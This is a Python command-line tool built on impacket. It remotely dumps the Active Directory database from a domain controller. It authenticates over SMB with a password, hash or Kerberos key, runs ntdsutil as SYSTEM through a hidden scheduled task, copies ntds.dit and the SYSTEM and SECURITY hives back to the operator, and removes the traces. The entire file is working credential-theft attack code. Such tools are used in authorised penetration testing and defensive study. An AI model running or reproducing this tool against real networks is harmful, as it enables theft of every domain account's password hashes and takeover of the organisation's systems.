#!/usr/bin/env python

import operator
import sys
import os
import argparse
import random
import string
import logging
import time
import ntpath

from impacket.examples import logger
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, \
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.examples.utils import parse_target

## From impacket/atexec.py

CODEC = sys.stdout.encoding

class TSCH_EXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None,
                 command=None, sessionId=None, silentCommand=False):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__command = command
        self.__silentCommand = silentCommand
        self.sessionId = sessionId

        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def play(self, addr):
        stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % addr
        rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                         self.__aesKey)
            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
        try:
            self.doStuff(rpctransport)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >=0:
                logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')

    def doStuff(self, rpctransport):
        def output_callback(data):
            if logging.getLogger().level == logging.DEBUG:
                try:
                    print(data.decode(CODEC))
                except UnicodeDecodeError:
                    logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                                'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute atexec.py '
                                'again with -codec and the corresponding codec')
                    print(data.decode(CODEC, errors='replace'))

        def xml_escape(data):
            replace_table = {
                 "&": "&amp;",
                 '"': "&quot;",
                 "'": "&apos;",
                 ">": "&gt;",
                 "<": "&lt;",
                 }
            return ''.join(replace_table.get(c, c) for c in data)

        def cmd_split(cmdline):
            cmdline = cmdline.split(" ", 1)
            cmd = cmdline[0]
            args = cmdline[1] if len(cmdline) > 1 else ''

            return [cmd, args]

        dce = rpctransport.get_dce_rpc()

        dce.set_credentials(*rpctransport.get_credentials())
        if self.__doKerberos is True:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
        tmpFileName = tmpName + '.tmp'

        if self.sessionId is not None:
            cmd, args = cmd_split(self.__command)
        else:
            cmd = "cmd.exe"
            args = "/C %s > %%windir%%\\Temp\\%s 2>&1" % (self.__command, tmpFileName)

        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%s</Command>
      <Arguments>%s</Arguments>
    </Exec>
  </Actions>
</Task>
        """ % ((xml_escape(cmd)), 
            (xml_escape(args)))
        taskCreated = False
        try:
            logging.debug('Creating task \\%s' % tmpName)
            tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
            taskCreated = True

            logging.debug('Running task \\%s' % tmpName)
            done = False

            if self.sessionId is None:
                tsch.hSchRpcRun(dce, '\\%s' % tmpName)
            else:
                try:
                    tsch.hSchRpcRun(dce, '\\%s' % tmpName, flags=tsch.TASK_RUN_USE_SESSION_ID, sessionId=self.sessionId)
                except Exception as e:
                    if str(e).find('ERROR_FILE_NOT_FOUND') >= 0 or str(e).find('E_INVALIDARG') >= 0 :
                        logging.debug('The specified session doesn\'t exist!')
                        done = True
                    else:
                        raise

            while not done:
                logging.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
                resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % tmpName)
                if resp['pLastRuntime']['wYear'] != 0:
                    done = True
                else:
                    time.sleep(2)

            logging.debug('Deleting task \\%s' % tmpName)
            tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
            taskCreated = False
        except tsch.DCERPCSessionError as e:
            logging.error(e)
            e.get_packet().dump()
        finally:
            if taskCreated is True:
                tsch.hSchRpcDelete(dce, '\\%s' % tmpName)

        if self.sessionId is not None:
            dce.disconnect()
            return

        # if self.__silentCommand:
        #     dce.disconnect()
        #     return

        smbConnection = rpctransport.get_smb_connection()
        waitOnce = True
        while True:
            try:
                logging.debug('Attempting to read ADMIN$\\Temp\\%s' % tmpFileName)
                smbConnection.getFile('ADMIN$', 'Temp\\%s' % tmpFileName, output_callback)
                break
            except Exception as e:
                if str(e).find('SHARING') > 0:
                    time.sleep(3)
                elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                    if waitOnce is True:
                        # We're giving it the chance to flush the file before giving up
                        time.sleep(3)
                        waitOnce = False
                    else:
                        raise
                else:
                    raise
        logging.debug('Deleting file ADMIN$\\Temp\\%s' % tmpFileName)
        smbConnection.deleteFile('ADMIN$', 'Temp\\%s' % tmpFileName)

        dce.disconnect()

class Target:
    def __init__(self, options) -> None:
        domain, username, password, address = parse_target(options.target)

        if domain is None:
            domain = ""

        if (
            password == ""
            and username != ""
            and options.hashes is None
            and options.no_pass is not True
        ):
            from getpass import getpass

            password = getpass("Password:")
        hashes = options.hashes
        if hashes is not None:
            hashes = hashes.split(':')
            if len(hashes) == 1:
                (nthash,) = hashes
                lmhash = nthash
            else:
                lmhash, nthash = hashes
        else:
            lmhash = nthash = ''
        
        if options.dc_ip is None:
            options.dc_ip = address

        self.domain = domain
        self.username = username[:20]
        self.password = password
        self.address = address
        self.lmhash = lmhash
        self.nthash = nthash
        self.ntlmhash = "%s:%s" % (lmhash,nthash)
        self.do_kerberos = options.k
        self.dc_ip = options.dc_ip
        self.aesKey = options.aesKey

    def __repr__(self) -> str:
        return "<Target (%s)>" % repr(self.__dict__)

class Ntdsutil:
    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options

        self.target = Target(options)
        self.smb_session = None
        self._is_admin = None

        self.share = "ADMIN$"
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.tmp_share = self.tmp_dir.split("C:\\Windows\\")[1]
        self.dump_location = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
        self.dir_result = 'ntdsutil'
        if options.outputdir is not None and options.outputdir != '':
            self.dir_result = options.outputdir  

    def connect(self) -> None:
        try:
            self.smb_session = SMBConnection(self.target.address,self.target.address)
            if self.target.do_kerberos:
                self.smb_session.kerberosLogin(
                    user=self.target.username,
                    password=self.target.password,
                    domain=self.target.domain,
                    lmhash=self.target.lmhash,
                    nthash=self.target.nthash,
                    aesKey=self.target.aesKey
                    )
            else:
                self.smb_session.login(
                    user=self.target.username,
                    password=self.target.password,
                    domain=self.target.domain,
                    lmhash=self.target.lmhash,
                    nthash=self.target.nthash
                    )
        except Exception as e:
            print(str(e))
            sys.exit(1)
        return self.smb_session

    def run(self):
        self.connect()
        
        if self.is_admin:
            logging.info("Connected to %s as %s\\%s %s" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
            command = ["powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full %s%s' q q\"" % (self.tmp_dir, self.dump_location)]
            logging.info('Dumping ntds with ntdsutil.exe to %s%s' % (self.tmp_dir,self.dump_location))
            atsvc_exec = TSCH_EXEC(self.target.username, self.target.password, self.target.domain, self.target.ntlmhash, self.target.aesKey, self.target.do_kerberos, options.dc_ip,
                           ' '.join(command), None, silentCommand=operator.not_(self.options.debug))
            atsvc_exec.play(self.target.address)
            if not os.path.isdir(self.dir_result):
                os.makedirs(self.dir_result, exist_ok=True)
                os.makedirs(os.path.join(self.dir_result, 'Active Directory'), exist_ok=True)
                os.makedirs(os.path.join(self.dir_result, 'registry'), exist_ok=True)

            # check if ntds.dit is dumped
            dumped = False
            directories = self.smb_session.listPath(shareName=self.share, path=ntpath.normpath(self.tmp_share + self.dump_location + '\\Active Directory\\ntds.dit'))
            for d in directories:
                if d.get_longname() == 'ntds.dit':
                    dumped = True
            if dumped:
                logging.info("NTDS successfuly dumped!")
            else:
                logging.error("NTDS not dumped. Exiting...")
                sys.exit(1)


            logging.info("Copying NTDS dump to %s" % self.dir_result)
            logging.debug('Copy ntds.dit to host')
            with open(os.path.join(self.dir_result,'Active Directory','ntds.dit'), 'wb+') as dump_file:
                try:
                    self.smb_session.getFile(self.share, self.tmp_share + self.dump_location + '\\Active Directory\\ntds.dit', dump_file.write)
                    logging.debug('Copied ntds.dit file')
                except Exception as e:
                    logging.error('Error while get ntds.dit file: {}'.format(e))

            logging.debug('Copy SYSTEM to host')
            with open(os.path.join(self.dir_result,'registry','SYSTEM'), 'wb+') as dump_file:
                try:
                    self.smb_session.getFile(self.share, self.tmp_share + self.dump_location + '\\registry\\SYSTEM', dump_file.write)
                    logging.debug('Copied SYSTEM file')
                except Exception as e:
                    logging.error('Error while get SYSTEM file: {}'.format(e))

            logging.debug('Copy SECURITY to host')
            with open(os.path.join(self.dir_result,'registry','SECURITY'), 'wb+') as dump_file:
                try:
                    self.smb_session.getFile(self.share, self.tmp_share + self.dump_location + '\\registry\\SECURITY', dump_file.write)
                    logging.debug('Copied SECURITY file')
                except Exception as e:
                    logging.error('Error while get SECURITY file: {}'.format(e))
            logging.info("NTDS dump copied to %s" % self.dir_result)
            try:
                command = ["rmdir /s /q %s%s" % (self.tmp_dir, self.dump_location)]
                atsvc_exec = TSCH_EXEC(self.target.username, self.target.password, self.target.domain, self.target.ntlmhash, self.target.aesKey, self.target.do_kerberos, options.dc_ip,
                           ' '.join(command), None, silentCommand=operator.not_(self.options.debug))
                atsvc_exec.play(self.target.address)
                logging.info('Deleted %s%s dump directory on the %s share' % (self.tmp_dir, self.dump_location, self.share))
            except Exception as e:
                logging.error('Error deleting {} directory on share {}: {}'.format(self.dump_location, self.share, e))
        else:
            logging.info("Not an admin, exiting...")

            

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin
        try:
            self.smb_session.connectTree('C$')
            is_admin = True
        except:
            is_admin = False
            pass
        self._is_admin = is_admin
        return self._is_admin

if __name__ == '__main__':
    logger.init()

    parser = argparse.ArgumentParser(
        description="Dump NTDS with ntdsutil, remotely", add_help=True
    )

    parser.add_argument(
        "target",
        action="store",
        help="[[domain/]username[:password]@]<target name or address>",
    )

    parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")

    parser.add_argument(
        "-hashes",
        action="store",
        metavar="LMHASH:NTHASH",
        help="NTLM hashes, format is LMHASH:NTHASH",
    )
    parser.add_argument(
        "-no-pass", action="store_true", help="don't ask for password (useful for -k)"
    )
    parser.add_argument(
        "-k",
        action="store_true",
        help="Use Kerberos authentication. Grabs credentials from ccache file "
        "(KRB5CCNAME) based on target parameters. If valid credentials "
        "cannot be found, it will use the ones specified in the command "
        "line",
    )
    parser.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    parser.add_argument(
        "-dc-ip",
        action="store",
        metavar="ip address",
        help=(
            "IP Address of the domain controller. If omitted it will use the domain "
            "part (FQDN) specified in the target parameter"
        ),
    )
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                          'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                          'again with -codec and the corresponding codec ' % CODEC)

    parser.add_argument('-outputdir', action='store', help='Output directory to store dumped file')

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    try:
        executor = Ntdsutil(options)
        executor.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        print('ERROR: %s' % str(e))